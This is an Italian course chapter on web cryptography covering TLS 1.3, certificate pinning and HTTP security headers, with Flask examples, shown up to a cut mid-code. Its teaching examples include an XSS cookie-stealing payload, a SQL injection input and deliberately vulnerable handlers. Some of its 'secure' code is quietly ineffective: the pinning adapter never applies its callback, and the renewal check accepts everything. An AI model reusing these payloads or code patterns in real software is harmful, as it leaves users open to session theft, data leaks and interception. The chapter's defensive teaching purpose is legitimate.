# Capitolo 24 - Crittografia nelle Applicazioni Web

> **Corso**: Sistemi e Reti 3  
> **Parte**: 7 - Applicazioni Pratiche  
> **Autore**: Prof. Filippo Bilardo

---

## 📑 Indice

1. [Cos'è la Crittografia Web](#cosè-la-crittografia-web)
2. [Il Problema della Sicurezza Web](#il-problema-della-sicurezza-web)
3. [HTTPS e TLS - Transport Layer Security](#https-e-tls)
4. [Certificate Pinning](#certificate-pinning)
5. [HTTP Security Headers](#http-security-headers)
6. [Web Crypto API](#web-crypto-api-javascript)
7. [JWT - JSON Web Tokens](#jwt-json-web-tokens)
8. [OAuth 2.0 - Delegated Authorization](#oauth-20)
9. [Session Management](#session-management)
10. [API Security](#api-security)
11. [Vulnerabilità Web Comuni](#vulnerabilità-web-comuni)
12. [Best Practices](#best-practices)
13. [Implementazioni Pratiche Complete](#implementazioni-pratiche-complete)
14. [Applicazioni Reali](#applicazioni-reali)
15. [Esercizi](#esercizi)

---

## Cos'è la Crittografia Web

### Definizione

La **crittografia nelle applicazioni web** è l'insieme di tecniche crittografiche applicate per proteggere:
- **Comunicazioni** tra client e server
- **Dati in transito** (rete)
- **Dati memorizzati** (browser, database)
- **Identità** degli utenti
- **Integrità** delle richieste e risposte

### Analogia del Mondo Reale 🏦

Immagina un'applicazione web come una **banca online**:

```
Senza Crittografia (HTTP)          Con Crittografia (HTTPS)
════════════════════════           ════════════════════════

📧 Cartolina aperta                 📦 Busta sigillata
   └─ Tutti possono leggere           └─ Solo mittente e destinatario

🏪 Negozio senza porte              🏛️ Caveau bancario  
   └─ Chiunque entra                  └─ Solo autorizzati

📝 Post-it sul monitor              🔐 Cassetta di sicurezza
   └─ Password visibile                └─ Credenziali protette
```

### I 4 Pilastri della Sicurezza Web

```
┌────────────────────────────────────────────────────┐
│          SICUREZZA APPLICAZIONI WEB                │
├────────────────────────────────────────────────────┤
│                                                    │
│  🔒 CONFIDENTIALITY (Riservatezza)                 │
│     └─ TLS/HTTPS cifra i dati in transito          │
│     └─ Web Crypto API cifra nel browser            │
│                                                    │
│  ✅ INTEGRITY (Integrità)                          │
│     └─ HMAC firma le richieste API                 │
│     └─ Subresource Integrity verifica script       │
│                                                    │
│  🎫 AUTHENTICATION (Autenticazione)                │
│     └─ JWT identifica gli utenti                   │
│     └─ OAuth2 delega l'autorizzazione              │
│                                                    │
│  🚫 AUTHORIZATION (Autorizzazione)                 │
│     └─ Token definiscono permessi                  │
│     └─ RBAC controlla l'accesso                    │
│                                                    │
└────────────────────────────────────────────────────┘
```

---

## Il Problema della Sicurezza Web

### Scenario 1: Il Pericolo di HTTP Semplice

```python
# ❌ Applicazione INSICURA (HTTP)
from flask import Flask, request
app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']  # 🚨 PASSWORD IN CHIARO!
    
    # Verifica credenziali...
    return "Login successful"

# Server HTTP (porta 80)
app.run(host='0.0.0.0', port=80)
```

**Cosa può fare un attaccante?** 🕵️

```
1. SNIFFING (Intercettazione)
   ┌─────────┐  HTTP   ┌──────────┐  Intercetta   ┌────────┐
   │ Browser │────────►│ Attacker │──────────────►│ Server │
   └─────────┘         └──────────┘               └────────┘
                            │
                            └─► Password visibile: "MyPass123"

2. MAN-IN-THE-MIDDLE (MitM)
   ┌─────────┐         ┌──────────┐         ┌────────┐
   │ Browser │◄───────►│ Attacker │◄───────►│ Server │
   └─────────┘         └──────────┘         └────────┘
                       Modifica richieste
                       Inietta contenuto

3. SESSION HIJACKING
   Cookie: session_id=abc123  (non crittografato)
   Attacker copia il cookie → accede come vittima
```

### Scenario 2: XSS (Cross-Site Scripting)

```python
# ❌ VULNERABILE a XSS
@app.route('/search')
def search():
    query = request.args.get('q')
    # Direttamente nel HTML senza escape!
    return f"<h1>Risultati per: {query}</h1>"

# Attacco:
# https://example.com/search?q=<script>alert(document.cookie)</script>
# Il browser esegue lo script! Ruba cookie di sessione.
```

### Scenario 3: SQL Injection

```python
# ❌ VULNERABILE a SQL Injection
@app.route('/user/<user_id>')
def get_user(user_id):
    query = f"SELECT * FROM users WHERE id = {user_id}"
    # Attacco: /user/1 OR 1=1
    # Query diventa: SELECT * FROM users WHERE id = 1 OR 1=1
    # Restituisce TUTTI gli utenti!
```

### La Soluzione: Approccio Multi-Layer

```
┌─────────────────────────────────────────────────┐
│           DIFESE MULTIPLE (Defense in Depth)    │
├─────────────────────────────────────────────────┤
│                                                 │
│  Layer 1: TRANSPORT SECURITY                    │
│  └─ TLS 1.3, HTTPS, Certificate Pinning         │
│                                                 │
│  Layer 2: APPLICATION SECURITY                  │
│  └─ Input Validation, Output Encoding, WAF      │
│                                                 │
│  Layer 3: AUTHENTICATION & AUTHORIZATION        │
│  └─ JWT, OAuth2, MFA, RBAC                      │
│                                                 │
│  Layer 4: DATA PROTECTION                       │
│  └─ Encryption at rest, Secure cookies          │
│                                                 │
│  Layer 5: MONITORING & LOGGING                  │
│  └─ Audit logs, Intrusion Detection, SIEM       │
│                                                 │
└─────────────────────────────────────────────────┘
```

---

## HTTPS e TLS

### Cos'è TLS (Transport Layer Security)

**TLS** è il protocollo che:
1. **Cifra** i dati in transito tra browser e server
2. **Autentica** il server (e opzionalmente il client)
3. **Garantisce l'integrità** dei dati trasmessi

**Evoluzione storica**:
```
SSL 1.0 (1994) - Mai rilasciato (vulnerabilità)
SSL 2.0 (1995) - Deprecato (DROWN attack)
SSL 3.0 (1996) - Deprecato (POODLE attack)
TLS 1.0 (1999) - Deprecato (BEAST attack)
TLS 1.1 (2006) - Deprecato
TLS 1.2 (2008) - ✅ Ancora sicuro
TLS 1.3 (2018) - ✅ Raccomandato (più veloce e sicuro)
```

### Come Funziona TLS 1.3 - Handshake Completo

```
Client                                                Server
══════                                                ══════

1️⃣ ClientHello
   - Versione TLS: 1.3
   - Random (32 byte)
   - Cipher suites supportati:
     * TLS_AES_128_GCM_SHA256
     * TLS_AES_256_GCM_SHA384
     * TLS_CHACHA20_POLY1305_SHA256
   - Key Share (chiave pubblica effimera)
   - Extensions (SNI, ALPN)           ────────────────►
   
                                      2️⃣ ServerHello
                                         - Cipher suite scelto
                                         - Key Share (pubblica server)
                                         
                                      3️⃣ {EncryptedExtensions}
                                         - Extensions aggiuntive
                                         
                                      4️⃣ {Certificate}
                                         - Certificato X.509
                                         - Catena di certificati
                                         
                                      5️⃣ {CertificateVerify}
                                         - Firma digitale del certificato
                                         
                                      6️⃣ {Finished}
                                 ◄────────────────────── - HMAC di tutti i messaggi
   
7️⃣ {Finished}
   - HMAC di tutti i messaggi         ────────────────►
   
   [Da qui in poi: tutto crittografato con chiavi simmetriche]
   
8️⃣ Application Data                  ◄────────────────► Application Data
   HTTP Request crittografato                            HTTP Response crittografato

Note: {} = crittografato con chiavi derivate dall'handshake
```

### Cipher Suite: Cosa Significa?

Un **cipher suite** specifica gli algoritmi usati:

```
TLS_AES_256_GCM_SHA384
│   │   │   │   │
│   │   │   │   └─ Hash: SHA-384 (HKDF key derivation)
│   │   │   └───── AEAD: GCM (Galois/Counter Mode)
│   │   └───────── Encryption: AES-256
│   └───────────── Protocollo: TLS
└───────────────── Famiglia

TLS_CHACHA20_POLY1305_SHA256
│   │         │         │
│   │         │         └─ Hash: SHA-256
│   │         └─────────── MAC: Poly1305
│   └───────────────────── Encryption: ChaCha20
└───────────────────────── Protocollo: TLS
```

### Protocollo TLS 1.3

**Transport Layer Security** cifra comunicazioni HTTP.

```
Client                                Server
------                                ------
ClientHello
  + supported ciphers
  + extensions          ────────►
  
                        ◄────────  ServerHello
                                    + certificate
                                    + key_share
                                    
[Derive session keys]               [Derive session keys]

Encrypted HTTP        ◄────────►   Encrypted HTTP
```

### Perché TLS 1.3 è Meglio di TLS 1.2?

| Caratteristica | TLS 1.2 | TLS 1.3 |
|----------------|---------|---------|
| **Handshake RTT** | 2-RTT | 1-RTT (più veloce) |
| **0-RTT Resumption** | ❌ | ✅ (session resumption) |
| **Cipher Suites** | 37 (molti insicuri) | 5 (solo sicuri) |
| **Algoritmi deprecati** | RSA key exchange, CBC, RC4, MD5, SHA-1 | ❌ Rimossi tutti |
| **Forward Secrecy** | Opzionale | ✅ Obbligatorio (ECDHE) |
| **Encrypted Extensions** | ❌ (metadata in chiaro) | ✅ (massima privacy) |

**Forward Secrecy (Perfect Forward Secrecy - PFS)**:
```
Scenario senza PFS:
- Attacker registra tutto il traffico crittografato
- In futuro ottiene la chiave privata del server
- Decripta TUTTO il traffico passato 😱

Scenario con PFS (TLS 1.3):
- Ogni sessione usa chiavi effimere diverse (ECDHE)
- Anche con chiave privata server, traffico passato rimane sicuro ✅
```

### Implementazione Python (Server HTTPS)

```python
from flask import Flask, request, jsonify
import ssl

app = Flask(__name__)

@app.route('/')
def index():
    return "Secure HTTPS Server!"

@app.route('/api/data', methods=['POST'])
def api_data():
    data = request.get_json()
    return jsonify({'received': data, 'secure': request.is_secure})

if __name__ == '__main__':
    # Crea contesto SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('server.crt', 'server.key')
    
    # Configurazione sicura TLS 1.3
    context.minimum_version = ssl.TLSVersion.TLSv1_3  # Solo TLS 1.3
    context.maximum_version = ssl.TLSVersion.TLSv1_3
    
    # Cipher suites moderni (TLS 1.3)
    # Non serve specificarli, TLS 1.3 usa automaticamente solo suite sicure
    
    # Avvia server HTTPS
    app.run(host='0.0.0.0', port=443, ssl_context=context)
```

### Configurazione Avanzata TLS

```python
import ssl

def create_secure_ssl_context():
    """Crea contesto SSL con configurazione massima sicurezza"""
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    
    # 1. Carica certificato e chiave
    context.load_cert_chain(
        certfile='fullchain.pem',  # Certificato + chain
        keyfile='privkey.pem'       # Chiave privata
    )
    
    # 2. Solo TLS 1.2+ (preferibilmente 1.3)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    
    # 3. Cipher suites sicuri (ordine di preferenza)
    context.set_ciphers(':'.join([
        'ECDHE+AESGCM',           # Forward secrecy + AEAD
        'ECDHE+CHACHA20',         # Alternative moderna
        'DHE+AESGCM',             # Fallback con FS
        '!aNULL',                 # No anonymous
        '!eNULL',                 # No encryption
        '!EXPORT',                # No export ciphers
        '!DES',                   # No DES
        '!MD5',                   # No MD5
        '!PSK',                   # No pre-shared keys
        '!RC4',                   # No RC4
        '!CBC'                    # No CBC mode (BEAST)
    ]))
    
    # 4. Opzioni aggiuntive
    context.options |= ssl.OP_NO_TLSv1    # Disabilita TLS 1.0
    context.options |= ssl.OP_NO_TLSv1_1  # Disabilita TLS 1.1
    context.options |= ssl.OP_NO_COMPRESSION  # Previene CRIME attack
    context.options |= ssl.OP_CIPHER_SERVER_PREFERENCE  # Server sceglie cipher
    
    # 5. OCSP Stapling (opzionale, migliora performance)
    # context.set_ocsp_stapling(enabled=True)
    
    return context

# Usa contesto
app.run(ssl_context=create_secure_ssl_context())
```

### Generazione Certificato Self-Signed

```bash
# Genera chiave privata RSA
openssl genrsa -out server.key 2048

# Genera certificato autofirmato (per testing)
openssl req -new -x509 -key server.key -out server.crt -days 365 \
    -subj "/C=IT/ST=Lazio/L=Rome/O=MyCompany/CN=localhost"

# Verifica certificato
openssl x509 -in server.crt -text -noout

# ⚠️ Per produzione: usa Let's Encrypt!
# (certificati gratuiti, rinnovati automaticamente)
```

### Let's Encrypt - Certificati Gratis e Automatici

```bash
# 1. Installa certbot
sudo apt install certbot python3-certbot-nginx

# 2. Ottieni certificato (con nginx)
sudo certbot --nginx -d example.com -d www.example.com

# 3. Rinnovo automatico (cron job)
sudo certbot renew --dry-run

# Certificati salvati in:
# /etc/letsencrypt/live/example.com/fullchain.pem
# /etc/letsencrypt/live/example.com/privkey.pem
```

### Client HTTPS (Python)

```python
import requests
import ssl
import certifi

# ✅ Request HTTPS standard (verifica certificato)
response = requests.get('https://api.example.com/data')
print(f"Status: {response.status_code}")

# ✅ Verifica esplicita certificato
response = requests.get(
    'https://api.example.com/data',
    verify=True  # Default, sempre True in produzione!
)

# ✅ Usa bundle certificati aggiornato (certifi)
response = requests.get(
    'https://api.example.com/data',
    verify=certifi.where()  # CA bundle di Mozilla
)

# ⚠️ Self-signed certificate (solo per testing!)
response = requests.get(
    'https://localhost:8443',
    verify='server.crt'  # Specifica certificato server
)

# ❌ PERICOLOSO: Disabilita verifica (MAI in produzione!)
response = requests.get(
    'https://api.example.com/data',
    verify=False  # ❌ Vulnerabile a MitM!
)

# 🔍 Ispeziona connessione TLS
print(f"TLS Version: {response.raw.version}")
print(f"Cipher: {response.raw._connection.sock.cipher()}")

# Esempio output:
# TLS Version: 771 (TLS 1.2) o 772 (TLS 1.3)
# Cipher: ('TLS_AES_256_GCM_SHA384', 'TLSv1.3', 256)
```

### Test di Sicurezza TLS

```python
import socket
import ssl
from datetime import datetime

def test_tls_connection(hostname, port=443):
    """Testa connessione TLS e mostra dettagli"""
    
    context = ssl.create_default_context()
    
    with socket.create_connection((hostname, port)) as sock:
        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
            print(f"🔐 TLS Connection Test: {hostname}\n")
            
            # 1. Versione TLS
            print(f"TLS Version: {ssock.version()}")
            
            # 2. Cipher suite
            cipher = ssock.cipher()
            print(f"Cipher Suite: {cipher[0]}")
            print(f"Protocol: {cipher[1]}")
            print(f"Bits: {cipher[2]}\n")
            
            # 3. Certificato
            cert = ssock.getpeercert()
            print("📜 Certificate Info:")
            print(f"  Subject: {dict(x[0] for x in cert['subject'])}")
            print(f"  Issuer: {dict(x[0] for x in cert['issuer'])}")
            print(f"  Version: {cert['version']}")
            
            # 4. Validità certificato
            not_before = datetime.strptime(cert['notBefore'], '%b %d %H:%M:%S %Y %Z')
            not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
            print(f"  Valid from: {not_before}")
            print(f"  Valid until: {not_after}")
            
            # 5. SAN (Subject Alternative Names)
            if 'subjectAltName' in cert:
                print(f"  SANs: {[x[1] for x in cert['subjectAltName']]}")
            
            # 6. Verifica hostname
            ssl.match_hostname(cert, hostname)
            print(f"\n✅ Hostname verification passed!")

# Test
test_tls_connection("www.google.com")
test_tls_connection("github.com")
```

---

## Certificate Pinning

### Cos'è il Certificate Pinning

**Problema**: Anche con HTTPS, un attaccante con accesso a una CA (Certificate Authority) compromessa può creare certificati validi per qualsiasi dominio e intercettare il traffico.

**Soluzione**: **Certificate Pinning** = "fissare" (pin) il certificato o la chiave pubblica del server nell'applicazione, rifiutando qualsiasi altro certificato anche se valido.

### Analogia del Mondo Reale 🔑

```
Scenario normale (trust CA):
════════════════════════════
Cliente: "Mi fido di questa banca perché il certificato è firmato da un'autorità"
         └─ Ma se l'autorità è corrotta? 🤔

Certificate Pinning:
═══════════════════
Cliente: "Mi fido SOLO di questa specifica chiave pubblica che conosco già"
         └─ Anche se un'altra CA dice OK, io rifiuto! ✅
```

### Tipi di Pinning

| Tipo | Cosa Pinnare | Durata | Flessibilità |
|------|--------------|--------|--------------|
| **Certificate Pinning** | Certificato completo | Breve (es. 90 giorni) | ❌ Bassa (cert change = break) |
| **Public Key Pinning** | Solo chiave pubblica | Media/Lunga | ✅ Media (rinnovo cert OK) |
| **CA Pinning** | CA root/intermediate | Lunga | ✅✅ Alta (più cert OK) |

### Implementazione Certificate Pinning

**Problema**: Attaccante con CA compromessa può falsificare certificati.

**Soluzione**: **Pin** (fissa) il certificato o la chiave pubblica del server.

```python
import hashlib
import ssl
import socket
from urllib.parse import urlparse
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization

def get_cert_fingerprint(hostname, port=443):
    """Ottieni fingerprint SHA-256 del certificato"""
    context = ssl.create_default_context()
    
    with socket.create_connection((hostname, port)) as sock:
        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
            # Ottieni certificato in formato DER (binario)
            cert_der = ssock.getpeercert(binary_form=True)
            
            # SHA-256 fingerprint del certificato completo
            fingerprint = hashlib.sha256(cert_der).hexdigest()
            return fingerprint

def get_public_key_hash(hostname, port=443):
    """Ottieni hash SHA-256 della chiave pubblica (SPKI - Subject Public Key Info)"""
    context = ssl.create_default_context()
    
    with socket.create_connection((hostname, port)) as sock:
        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
            cert_der = ssock.getpeercert(binary_form=True)
            
            # Parse certificato
            cert = x509.load_der_x509_certificate(cert_der, default_backend())
            
            # Estrai chiave pubblica in formato SPKI
            public_key = cert.public_key()
            spki = public_key.public_bytes(
                encoding=serialization.Encoding.DER,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            
            # Hash SHA-256 dell'SPKI
            spki_hash = hashlib.sha256(spki).hexdigest()
            return spki_hash

def verify_pinned_cert(hostname, expected_fingerprint, port=443):
    """Verifica certificate pinning (certificato completo)"""
    actual = get_cert_fingerprint(hostname, port)
    
    if actual != expected_fingerprint:
        raise ValueError(
            f"❌ Certificate mismatch!\n"
            f"Expected: {expected_fingerprint}\n"
            f"Got:      {actual}\n"
            f"⚠️  Possible MITM attack!"
        )
    
    return True

def verify_pinned_public_key(hostname, expected_spki_hash, port=443):
    """Verifica public key pinning (più flessibile)"""
    actual = get_public_key_hash(hostname, port)
    
    if actual != expected_spki_hash:
        raise ValueError(
            f"❌ Public key mismatch!\n"
            f"Expected: {expected_spki_hash}\n"
            f"Got:      {actual}\n"
            f"⚠️  Possible MITM attack!"
        )
    
    return True

# Test
print("=== Certificate Pinning Demo ===\n")

# 1. Ottieni fingerprint di google.com
print("🔍 Getting Google certificate fingerprint...")
google_fp = get_cert_fingerprint("www.google.com")
print(f"Certificate fingerprint: {google_fp[:32]}...")

# 2. Ottieni public key hash
google_pk = get_public_key_hash("www.google.com")
print(f"Public key hash: {google_pk[:32]}...\n")

# 3. Verifica (dovrebbe passare)
try:
    verify_pinned_cert("www.google.com", google_fp)
    print("✅ Certificate pinning verified!")
except ValueError as e:
    print(f"❌ {e}")

# 4. Test con hash errato (simula MitM)
print("\n🕵️  Simulating MITM attack (wrong fingerprint)...")
try:
    verify_pinned_cert("www.google.com", "0" * 64)
except ValueError as e:
    print(e)
```

### Certificate Pinning in Requests

```python
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.poolmanager import PoolManager
import ssl
import hashlib

class PinnedHTTPSAdapter(HTTPAdapter):
    """HTTPAdapter con certificate pinning"""
    
    def __init__(self, pinned_fingerprints, *args, **kwargs):
        self.pinned_fingerprints = pinned_fingerprints
        super().__init__(*args, **kwargs)
    
    def init_poolmanager(self, *args, **kwargs):
        context = ssl.create_default_context()
        
        # Callback per verifica pinning
        def verify_callback(conn, cert, errno, depth, ok):
            cert_der = ssl.DER_cert_to_PEM_cert(cert).encode()
            fingerprint = hashlib.sha256(cert_der).hexdigest()
            
            if fingerprint not in self.pinned_fingerprints:
                print(f"❌ Certificate not pinned! Got: {fingerprint}")
                return False
            
            return ok
        
        kwargs['ssl_context'] = context
        return super().init_poolmanager(*args, **kwargs)

# Uso
session = requests.Session()

# Pin multipli (per backup/rotazione certificati)
pinned_hashes = [
    get_cert_fingerprint("api.example.com"),
    "backup_cert_fingerprint_here"  # Certificato di backup
]

session.mount('https://', PinnedHTTPSAdapter(pinned_hashes))

# Richiesta con pinning
response = session.get('https://api.example.com/data')
```

### Public Key Pinning (HTTP Header - HPKP)

**⚠️ Deprecato**: HPKP è stato deprecato per rischi eccessivi (pinning errato blocca sito permanentemente). Usa invece **Expect-CT** o pinning a livello applicazione.

```python
# HPKP header (NON PIÙ RACCOMANDATO)
response.headers['Public-Key-Pins'] = (
    'pin-sha256="base64+primary+key+hash"; '
    'pin-sha256="base64+backup+key+hash"; '
    'max-age=5184000'  # 60 giorni
)

# ✅ ALTERNATIVA MODERNA: Expect-CT
response.headers['Expect-CT'] = (
    'max-age=86400, '
    'enforce, '
    'report-uri="https://example.com/ct-report"'
)
```

### Best Practices per Certificate Pinning

```python
import requests
import time
from datetime import datetime, timedelta

class SmartPinningManager:
    """Manager intelligente per certificate pinning"""
    
    def __init__(self, pins_config):
        """
        pins_config = {
            'api.example.com': {
                'pins': ['hash1', 'hash2'],  # Pin primario + backup
                'valid_until': datetime(2025, 12, 31),
                'update_check': 30  # Controlla aggiornamenti ogni 30 giorni
            }
        }
        """
        self.pins = pins_config
        self.last_check = {}
    
    def verify(self, hostname):
        """Verifica pin con gestione errori intelligente"""
        
        config = self.pins.get(hostname)
        if not config:
            raise ValueError(f"No pinning config for {hostname}")
        
        # 1. Controlla scadenza pin
        if datetime.now() > config['valid_until']:
            print(f"⚠️  Pins expired for {hostname}, updating...")
            self._update_pins(hostname)
        
        # 2. Ottieni hash attuale
        actual_hash = get_public_key_hash(hostname)
        
        # 3. Verifica contro pin
        if actual_hash not in config['pins']:
            # Pin non corrisponde: possibile MitM o rinnovo cert
            print(f"❌ Pin mismatch for {hostname}")
            
            # Controlla se è un rinnovo legittimo
            if self._check_legitimate_renewal(hostname, actual_hash):
                print("✅ Legitimate certificate renewal detected")
                config['pins'].append(actual_hash)
                return True
            else:
                raise ValueError(f"MITM attack suspected on {hostname}!")
        
        return True
    
    def _check_legitimate_renewal(self, hostname, new_hash):
        """Verifica se è un rinnovo certificato legittimo"""
        # Strategie:
        # 1. Controlla OCSP/CRL
        # 2. Verifica con CA (Certificate Transparency logs)
        # 3. Alert amministratore per verifica manuale
        # 4. Fallback: accetta se firmato da CA trusted
        return True  # Semplificato
    
    def _update_pins(self, hostname):
        """Aggiorna pins (da fonte sicura)"""
        # In produzione: scarica da server sicuro/config repository
        pass

# Regole d'oro per certificate pinning:
PINNING_BEST_PRACTICES = """
✅ DO:
1. Pinna almeno 2 certificati (primario + backup)
2. Usa public key pinning, non certificate pinning
3. Implementa meccanismo di fallback/aggiornamento
4. Monitora scadenze certificati
5. Testa recovery prima del deployment
6. Documenta processo di rinnovo certificati
7. Usa pinning solo per API critiche

❌ DON'T:
1. Pinna un solo certificato (lockout garantito!)
2. Hardcode pins senza update mechanism
3. Pinna certificati root CA (troppo generico)
4. Dimentica di aggiornare prima della scadenza
5. Ignora alert di mismatch (indaga sempre)
6. Pinna su domini che non controlli
7. Usa HPKP header (deprecato)
"""

print(PINNING_BEST_PRACTICES)
```

---

## HTTP Security Headers

### Cos'è un Security Header

Gli **HTTP Security Headers** sono direttive inviate dal server al browser per abilitare funzionalità di sicurezza:
- Protezione da XSS (Cross-Site Scripting)
- Prevenzione clickjacking
- Controllo risorse caricate
- Forzatura HTTPS

### Header di Sicurezza Essenziali

```python
SECURITY_HEADERS = {
    # 1️⃣ HSTS: Force HTTPS
    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload',
    
    # 2️⃣ Prevent MIME sniffing
    'X-Content-Type-Options': 'nosniff',
    
    # 3️⃣ Prevent clickjacking
    'X-Frame-Options': 'DENY',  # o 'SAMEORIGIN'
    
    # 4️⃣ XSS Protection (legacy, ma ancora utile)
    'X-XSS-Protection': '1; mode=block',
    
    # 5️⃣ Content Security Policy
    'Content-Security-Policy': "default-src 'self'; script-src 'self'",
    
    # 6️⃣ Referrer Policy
    'Referrer-Policy': 'strict-origin-when-cross-origin',
    
    # 7️⃣ Permissions Policy (Feature Policy)
    'Permissions-Policy': 'geolocation=(), microphone=(), camera=()',
}
```

### HSTS (HTTP Strict Transport Security)

Forza browser a usare **solo HTTPS** per un periodo specificato.

```python
from flask import Flask, make_response

app = Flask(__name__)

@app.after_request
def add_security_headers(response):
    """Aggiungi header di sicurezza a ogni risposta"""
    
    # HSTS: Force HTTPS for 1 year
    response.headers['Strict-Transport-Security'] = \
        'max-age=31536000; includeSubDomains; preload'
    
    # Prevent XSS
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    
    # Content Security Policy
    response.headers['Content-Security-Policy'] = \
        "default-src 'self'; script-src 'self'; style-src 'self'"
    
    # Referrer Policy
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    return response

@app.route('/')
def index():
    return "Secure headers enabled!"
```

### HSTS Preload List

```python
# HSTS con preload
response.headers['Strict-Transport-Security'] = \
    'max-age=31536000; includeSubDomains; preload'

# Cosa significa:
# - max-age=31536000: Valido per 1 anno (31536000 secondi)
# - includeSubDomains: Applica anche a tutti i sottodomini
# - preload: Candidato per HSTS Preload List del browser

# ⚠️ Prima di usare preload:
# 1. Assicurati che TUTTO il sito supporti HTTPS
# 2. Testa con max-age breve (es. 300 secondi)
# 3. Incrementa gradualmente max-age
# 4. Solo dopo: aggiungi a https://hstspreload.org/
```

**Cosa succede con HSTS attivo?**
```
1. User digita: http://example.com
2. Browser (con HSTS): "No! So che example.com vuole HTTPS!"
3. Browser upgrade automatico: https://example.com
4. ✅ Nessuna richiesta HTTP in chiaro inviata
```

### CSP (Content Security Policy)

Previene XSS specificando sorgenti consentite.

```python
# CSP Examples
CSP_POLICIES = {
    # 🔒 Policy STRETTA (massima sicurezza)
    'strict': """
        default-src 'none';
        script-src 'self';
        style-src 'self';
        img-src 'self';
        font-src 'self';
        connect-src 'self';
        frame-ancestors 'none';
        base-uri 'self';
        form-action 'self'
    """.replace('\n', ' ').strip(),
    
    # 🛡️ Policy MODERATA (bilanciata)
    'moderate': """
        default-src 'self';
        script-src 'self' 'unsafe-inline';
        style-src 'self' 'unsafe-inline';
        img-src 'self' https: data:;
        font-src 'self' https://fonts.gstatic.com;
        connect-src 'self' https://api.example.com
    """.replace('\n', ' ').strip(),
    
    # 🌐 Policy con CDN
    'with_cdn': """
        default-src 'self';
        script-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com;
        style-src 'self' https://cdn.jsdelivr.net;
        img-src 'self' https: data:;
        font-src 'self' https://fonts.gstatic.com
    """.replace('\n', ' ').strip(),
    
    # 📊 Report-only (monitoring senza bloccare)
    'report_only': """
        default-src 'self';
        report-uri /csp-violation-report
    """.replace('\n', ' ').strip()
}

# Applica policy
@app.route('/secure')
def secure_page():
    response = make_response("<h1>Secure Page</h1>")
    response.headers['Content-Security-Policy'] = CSP_POLICIES['strict']
    return response

# Modalità report-only (per testing)
@app.route('/test-csp')
def test_csp():
    response = make_response("<h1>Testing CSP</h1>")
    # Report-Only: monitora violazioni senza bloccare
    response.headers['Content-Security-Policy-Report-Only'] = CSP_POLICIES['report_only']
    return response

# Endpoint per ricevere report CSP
@app.route('/csp-violation-report', methods=['POST'])
def csp_report():
    violation = request.get_json()
    print(f"🚨 CSP Violation: {violation}")
    
    # Log su file/database
    # Analizza per identificare:
    # - XSS attempts
    # - Risorse non autorizzate
    # - Policy troppo restrittiva
    
    return '', 204  # No Content
```

### CSP Nonce per Script Inline

```python
import secrets

@app.route('/page-with-inline-script')
def page_with_inline():
    # Genera nonce casuale
    nonce = secrets.token_urlsafe(16)
    
    # CSP con nonce
    csp = f"default-src 'self'; script-src 'self' 'nonce-{nonce}'"
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta http-equiv="Content-Security-Policy" content="{csp}">
    </head>
    <body>
        <h1>Page with Inline Script</h1>
        
        <!-- ✅ Script con nonce: ALLOWED -->
        <script nonce="{nonce}">
            console.log("This script is allowed!");
        </script>
        
        <!-- ❌ Script senza nonce: BLOCKED -->
        <script>
            console.log("This will be blocked by CSP!");
        </script>
    </body>
    </html>
    """
    
    return html
```

### Permissions Policy (Feature Policy)

```python
@app.after_request
def add_permissions_policy(response):
    """Controlla accesso a feature del browser"""
    
    # Disabilita feature rischiose
    response.headers['Permissions-Policy'] = '; '.join([
        'geolocation=()',          # No geolocation
        'microphone=()',           # No microphone
        'camera=()',               # No camera
        'payment=()',              # No Payment Request API
        'usb=()',                  # No WebUSB
        'magnetometer=()',         # No magnetometer
        'gyroscope=()',            # No gyroscope
        'accelerometer=()',        # No accelerometer
        'ambient-light-sensor=()', # No ambient light
    ])
    
    # Abilita per origin specifici
    response.headers['Permissions-Policy'] = '; '.join([
        "geolocation=(self)",                    # Solo same-origin
        "camera=(self 'https://trusted.com')",   # Self + trusted
        "microphone=()"                          # Disabled
    ])
    
    return response
```

### Referrer-Policy

```python
# Controlla quali informazioni inviare nel Referer header

REFERRER_POLICIES = {
    # ❌ Nessun referrer (privacy massima, può rompere analytics)
    'no-referrer': 'no-referrer',
    
    # 🔒 Solo origin su HTTPS→HTTP downgrade
    'strict-origin': 'strict-origin',
    
    # ✅ RACCOMANDATO: Origin su cross-origin, full URL su same-origin
    'strict-origin-when-cross-origin': 'strict-origin-when-cross-origin',
    
    # 🌐 Sempre full URL (meno privacy)
    'unsafe-url': 'unsafe-url',
}

@app.route('/page')
def page():
    response = make_response("<h1>Page</h1>")
    response.headers['Referrer-Policy'] = REFERRER_POLICIES['strict-origin-when-cross-origin']
    return response
```

### Security Headers Completo con Flask

```python
from flask import Flask, request, make_response
from functools import wraps
import secrets

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(32)

class SecurityHeaders:
    """Manager centralizzato per security headers"""
    
    @staticmethod
    def get_csp_nonce():
        """Genera nonce per CSP"""
        if not hasattr(request, 'csp_nonce'):
            request.csp_nonce = secrets.token_urlsafe(16)
        return request.csp_nonce
    
    @staticmethod
    def apply_all(response):
        """Applica tutti gli header di sicurezza"""
        
        # HSTS
        response.headers['Strict-Transport-Security'] = \
            'max-age=31536000; includeSubDomains; preload'
        
        # Content Security Policy
        nonce = SecurityHeaders.get_csp_nonce()
        response.headers['Content-Security-Policy'] = (
            f"default-src 'self'; "
            f"script-src 'self' 'nonce-{nonce}'; "
            f"style-src 'self' 'nonce-{nonce}'; "
            f"img-src 'self' https: data:; "
            f"font-src 'self'; "
            f"connect-src 'self'; "
